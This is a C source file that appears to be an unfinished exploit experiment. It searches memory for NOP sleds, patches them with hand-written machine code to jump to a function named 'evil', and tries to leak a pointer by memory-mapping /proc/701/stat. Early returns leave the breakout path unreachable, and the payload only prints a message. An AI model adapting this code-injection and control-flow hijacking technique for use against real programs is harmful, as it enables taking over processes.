#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

void breakout(char *hint)
{
//char *hint;
char *tmp;
int i, j;

printf("hint = %x\n", hint);
printf("searching for nops...\n");

for(i = 0; i < 500; i++)
{

 for(j = 0; j < 10; j++)
 {
  if(*(hint+i+j) != '\x90') break;
 }

 if(j > 9)
 {
  printf("10 nops found @ %x\n", (hint+i));

  //80483c3:       b8 d4 82 04 08          mov    $0x80482d4,%eax
  //80483c8:       ff d0                   call   *%eax
  // evil @ 0x080485e9

  tmp = hint + i;
  *tmp++ = '\xb8';
  *tmp++ = '\xf9';
  *tmp++ = '\x85';
  *tmp++ = '\x04';
  *tmp++ = '\x08';
  *tmp++ = '\xff';
  *tmp++ = '\xd0';

  asm(
  "nop;"
  "nop;"
  "nop;"
  "nop;"
  "nop;"
  "nop;"
  "nop;"
  "nop;"
  "nop;"
  "nop;"
  );

  return;
 }
}

} // end of breakout

void evil()
{
 printf("breakout succeeded!\n");
 _exit(0);
}

int main()
{

 FILE *file;
 char *hint;
 void *mem = malloc(16);
 char *statmem;
 int fd;

 hint = NULL;

 //file = fopen("/proc/self/stat", "r");
 //fd = open("dl.c", O_RDWR);
 fd = open("/proc/701/stat", O_RDONLY);
 printf("fd: %d\n", fd);
 if(fd < 0)
 {
   printf("open failed\n");
   return 1;
 }

/*
 if(file == NULL) {
    printf("can't open /proc/self/stat\n");
    return 1;
 }

 fscanf(file, "%d %s %c %d %d %d %d %d %u %lu %lu %lu %lu %lu %lu %ld %ld %ld %ld %ld %ld %llu %lu %ld %lu %lu %lu %lu %lu %lu", mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, &hint);
*/

 statmem = mmap(NULL, getpagesize(), PROT_READ, MAP_PRIVATE | MAP_NORESERVE | MAP_NONBLOCK, fd, 0);

 //fclose(file);

 if((int)statmem == -1)
 {
	perror("mmap failed");
	close(fd);
	exit(1);
 }

 printf("0x%x\n", statmem);
 printf("%c %c %c %c %c\n", statmem[0], statmem[1], statmem[2], statmem[3], statmem[4]);

 close(fd);
 return 0;

 if(hint == NULL) {
    printf("hint == NULL\n");
    return 1;
 }




 printf("hint = %x\n", hint);

 return 0;

 printf("sleeping...\n");
 sleep(2);

 breakout(hint);

 printf("sleeping...\n");
 sleep(2);

 return 0;
}
